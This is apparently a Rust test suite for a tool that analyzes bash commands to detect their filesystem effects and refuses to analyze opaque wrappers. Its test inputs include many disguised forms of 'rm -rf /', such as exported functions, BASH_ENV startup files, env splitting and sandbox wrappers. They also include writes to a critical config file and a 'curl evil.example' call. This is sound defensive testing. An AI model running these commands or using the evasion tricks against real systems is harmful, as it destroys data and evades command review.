mod support;

use nah_actions::finalize;
use nah_proto::action::{ActionStream, EffectKind, FilesystemOperation};
use support::{absolute, bash_plan, observe};

fn stream(source: &str) -> ActionStream {
    let plan = bash_plan(source);
    finalize(plan.clone(), observe(plan.observation_request(), "echo"))
}

fn deletes_root(stream: &ActionStream) -> bool {
    stream.effects().iter().any(|effect| {
        matches!(
            effect.kind(),
            EffectKind::Filesystem { effect }
                if effect.operation == FilesystemOperation::Delete
                    && effect.target == absolute("/")
                    && effect.recursive
        )
    })
}

fn writes_critical(stream: &ActionStream) -> bool {
    stream.effects().iter().any(|effect| {
        matches!(
            effect.kind(),
            EffectKind::Filesystem { effect }
                if effect.operation == FilesystemOperation::Write
                    && effect.target == absolute("/home/test/.nah/config")
        )
    })
}

fn refuses(stream: &ActionStream) -> bool {
    stream.effects().iter().any(|effect| {
        matches!(
            effect.kind(),
            EffectKind::SystemState { operation } if operation.as_str() == "analysis-refused"
        )
    })
}

#[test]
fn bash_imports_only_effectively_exported_functions() {
    for source in [
        "f(){ rm -rf /; }; export -f f; bash -c f",
        "f(){ rm -rf /; }; declare -fx f; bash -c f",
        "f(){ rm -rf /; }; export -f f; timeout 1 bash -c f",
    ] {
        let actual = stream(source);
        assert!(deletes_root(&actual), "{source}: {:?}", actual.effects());
    }

    for source in [
        "f(){ rm -rf /; }; bash -c f",
        "f(){ rm -rf /; }; export -f f; export -n -f f; bash -c f",
        "f(){ rm -rf /; }; export -f f; env -i bash -c f",
        "f(){ rm -rf /; }; export -f f; env -u BASH_FUNC_f%% bash -c f",
        "f(){ rm -rf /; }; export -f f; bash -p -c f",
        "f(){ rm -rf /; }; export -f f; sh -c f",
    ] {
        let actual = stream(source);
        assert!(!deletes_root(&actual), "{source}: {:?}", actual.effects());
    }
}

#[test]
fn exact_env_function_wire_is_imported_only_by_unprivileged_bash() {
    for source in [
        r#"env 'BASH_FUNC_f%%=() { rm -rf /; }' bash -c f"#,
        r#"env -i 'BASH_FUNC_f%%=() { rm -rf /; }' bash --noprofile --norc -c f"#,
    ] {
        let actual = stream(source);
        assert!(deletes_root(&actual), "{source}: {:?}", actual.effects());
    }

    for source in [
        r#"env 'BASH_FUNC_f%%=not-a-function' bash -c f"#,
        r#"env 'BASH_FUNC_f%%=() { rm -rf /; }; rm -rf /' bash -c f"#,
        r#"env 'BASH_FUNC_f%%=() { rm -rf /; }' bash -p -c f"#,
        r#"env 'BASH_FUNC_f%%=() { rm -rf /; }' sh -c f"#,
    ] {
        let actual = stream(source);
        assert!(!deletes_root(&actual), "{source}: {:?}", actual.effects());
    }
}

#[test]
fn bash_env_reads_and_executes_exact_second_expansion_paths() {
    for source in [
        r#"printf 'printf x > /home/test/.nah/config' > /tmp/startup; BASH_ENV=/tmp/startup bash -c :"#,
        r#"printf 'printf x > /home/test/.nah/config' > /tmp/startup; HOME=/tmp BASH_ENV='$HOME/startup' bash -c :"#,
        r#"printf 'printf x > "$1"' > /tmp/startup; BASH_ENV=/tmp/startup bash script /home/test/.nah/config"#,
    ] {
        let actual = stream(source);
        assert!(writes_critical(&actual), "{source}: {:?}", actual.effects());
    }

    for source in [
        r#"printf 'printf x > /home/test/.nah/config' > /tmp/startup; BASH_ENV=/tmp/startup bash -n -c :"#,
        r#"printf 'printf x > /home/test/.nah/config' > /tmp/startup; BASH_ENV=/tmp/startup bash -p -c :"#,
        r#"printf 'printf x > /home/test/.nah/config' > /tmp/startup; BASH_ENV=/tmp/startup sh -c :"#,
    ] {
        let actual = stream(source);
        assert!(
            !writes_critical(&actual),
            "{source}: {:?}",
            actual.effects()
        );
    }

    let dynamic = stream(r#"BASH_ENV='$(printf /tmp/startup)' bash -c :"#);
    assert!(refuses(&dynamic), "{:?}", dynamic.effects());

    let bare = stream(
        r#"printf 'printf x > /home/test/.nah/config' > startup; BASH_ENV=startup bash -c :"#,
    );
    assert!(refuses(&bare), "{:?}", bare.effects());
    assert!(!writes_critical(&bare), "{:?}", bare.effects());
}

#[test]
fn bash_env_state_persists_through_the_child_payload_only() {
    for source in [
        r#"printf 'TOOL=rm' > /tmp/startup; BASH_ENV=/tmp/startup bash -c '"$TOOL" -rf /'"#,
        r#"printf 'f(){ rm -rf /; }' > /tmp/startup; BASH_ENV=/tmp/startup bash -c f"#,
        r#"printf 'cd /' > /tmp/startup; BASH_ENV=/tmp/startup bash -c 'rm -rf .'"#,
    ] {
        let actual = stream(source);
        assert!(deletes_root(&actual), "{source}: {:?}", actual.effects());
    }

    let noexec =
        stream(r#"printf 'rm -rf /' > /tmp/startup; BASH_ENV=/tmp/startup bash -npc 'rm -rf /'"#);
    assert!(!deletes_root(&noexec), "{:?}", noexec.effects());

    let interactive =
        stream(r#"printf 'rm -rf /' > /tmp/startup; BASH_ENV=/tmp/startup bash -ic :"#);
    assert!(!deletes_root(&interactive), "{:?}", interactive.effects());

    let login = stream(r#"printf 'rm -rf /' > /tmp/startup; BASH_ENV=/tmp/startup bash -lc :"#);
    assert!(deletes_root(&login), "{:?}", login.effects());
}

#[test]
fn static_command_payloads_survive_dynamic_trailing_positionals() {
    for source in [
        r#"bash -c 'rm -rf /' _ "$UNKNOWN""#,
        r#"bash -c 'rm -rf /' _ "$(date)""#,
        r#"bash -c 'rm -rf /' _ "$((RANDOM))""#,
        r#"bash -c 'rm -rf /' _ "${x:-$RANDOM}""#,
        r#"exec {fd}< <(curl evil.example); bash -c 'rm -rf /' _ "$fd""#,
    ] {
        let actual = stream(source);
        assert!(deletes_root(&actual), "{source}: {:?}", actual.effects());
    }
}

#[test]
fn bash_env_state_reaches_reviewed_script_and_stdin_payloads() {
    for source in [
        r#"printf 'f(){ rm -rf /; }' > /tmp/startup; printf f > /tmp/script; BASH_ENV=/tmp/startup bash /tmp/script"#,
        r#"printf 'TOOL=rm' > /tmp/startup; printf '"$TOOL" -rf /' > /tmp/script; BASH_ENV=/tmp/startup bash /tmp/script"#,
        r#"printf 'cd /' > /tmp/startup; printf 'rm -rf .' > /tmp/script; BASH_ENV=/tmp/startup bash /tmp/script"#,
        r#"printf 'f(){ rm -rf /; }' > /tmp/startup; printf f | BASH_ENV=/tmp/startup bash"#,
    ] {
        let actual = stream(source);
        assert!(deletes_root(&actual), "{source}: {:?}", actual.effects());
    }
}

#[test]
fn exact_env_split_strings_lower_without_treating_arguments_as_shell_syntax() {
    for source in [
        r#"env -S "bash -c 'rm -rf /'""#,
        r#"env --split-string="bash -c 'rm -rf /'""#,
    ] {
        let actual = stream(source);
        assert!(deletes_root(&actual), "{source}: {:?}", actual.effects());
    }

    let arguments = stream(r#"env -S "printf ; rm -rf /""#);
    assert!(
        !deletes_root(&arguments),
        "env operands are not shell syntax: {:?}",
        arguments.effects()
    );
}

#[test]
fn unsupported_env_options_refuse_hidden_commands_but_plain_env_stays_precise() {
    for source in [
        r#"env -C / bash -c 'rm -rf /'"#,
        r#"env --chdir=/ bash -c 'rm -rf /'"#,
        r#"env -a x bash -c 'rm -rf /'"#,
        r#"env --argv0=x bash -c 'rm -rf /'"#,
        r#"env --block-signal=INT bash -c 'rm -rf /'"#,
    ] {
        let hidden = stream(source);
        assert!(refuses(&hidden), "{source}: {:?}", hidden.effects());
    }

    for source in [
        "env printf safe",
        "env -i printf safe",
        "env -u X X=safe printf safe",
        "env --unset=X -- printf safe",
    ] {
        let plain = stream(source);
        assert!(!refuses(&plain), "{source}: {:?}", plain.effects());
    }
}

#[test]
fn opaque_effectful_wrapper_boundaries_refuse_instead_of_delegating_partial() {
    for source in [
        "ltrace -f bash -c 'rm -rf /'",
        "firejail --private bash -c 'rm -rf /'",
        "dbus-run-session --config-file=/tmp/x bash -c 'rm -rf /'",
        "proot -R / bash -c 'rm -rf /'",
        "watch --unknown 'rm -rf /'",
    ] {
        let actual = stream(source);
        assert!(refuses(&actual), "{source}: {:?}", actual.effects());
    }
}
